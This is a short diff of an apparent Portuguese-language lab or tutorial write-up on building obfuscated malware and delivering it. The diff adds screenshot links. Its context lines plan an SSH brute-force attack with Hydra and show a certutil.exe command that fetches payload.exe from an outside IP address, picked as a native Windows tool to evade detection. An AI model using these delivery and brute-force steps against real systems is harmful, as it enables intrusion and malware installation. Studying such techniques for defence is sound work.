@@ -206,10 +206,10 @@ wine cmd
 pyinstaller malwareobfuscated.spec
 ```
 
-[ PRINT OF CREATED MALWARE]
-
 ![Image](https://github.com/user-attachments/assets/7204a618-1173-485a-9aed-f3a4c04d3fba)
 
+[ PRINT OF CREATED MALWARE]
+![Image](https://github.com/user-attachments/assets/1db11fe3-941a-4fe1-957e-f6bf72283ac7)
 
 
 ## DELIVERING THE PAYLOAD 
@@ -218,6 +218,7 @@ Para entregarmos o payload vamos realizar um brute force attack em uma porta ssh
 para realizar a requisicao vamos testar alguns executaveis nativos do windowns para aumentar o nivel de ofucacao
 
 [PRINT HYDRA]
+![Image](https://github.com/user-attachments/assets/0e8ada1a-815a-4354-b30b-28359acb8ac5)
 
  ```certutil.exe -urlcache -split -f http://198.168.17.88/payload.exe payload.exe```
  
